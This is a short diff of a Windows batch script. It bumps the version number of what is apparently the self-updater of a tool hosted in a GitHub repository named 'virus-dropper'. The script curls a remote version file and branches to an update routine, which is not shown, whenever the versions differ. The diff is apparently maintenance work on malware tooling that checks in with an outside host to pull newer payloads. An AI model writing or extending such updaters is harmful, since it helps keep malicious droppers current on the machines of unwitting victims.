@@ -1,6 +1,5 @@
 @echo off
-cd C:\users\edwar\downloads
-set /a version=6
+set /a version=7
 @SET output=
 FOR /F %%I IN ('curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/version.txt"') DO @SET "output=%%I"
 If %output% == %version% exit ELSE goto update
